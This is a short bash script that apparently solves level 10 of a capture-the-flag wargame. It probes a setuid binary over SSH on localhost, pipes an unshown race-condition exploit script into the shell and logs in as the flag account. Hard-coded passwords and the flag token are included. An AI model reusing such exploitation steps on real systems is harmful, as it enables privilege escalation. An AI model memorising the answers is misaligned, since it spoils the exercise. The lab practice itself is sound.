#!/bin/bash

ssh() {
    sshpass -p 's5cAJpM8ev6XHw998pRWG728z' ssh level10@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh 'getfacl ./level10; getfacl token'

ssh 'strings ./level10'

ssh 'ltrace ./level10'

ssh 'strace ./level10'

ssh 'bash -s' < swapper.sh
    
sshpass -p 'woupa2yuojeeaaed06riuj63c' ssh flag10@localhost -p 2220 getflag  

# Check flag.Here is your token : feulo4b72j7edeahuete3no7c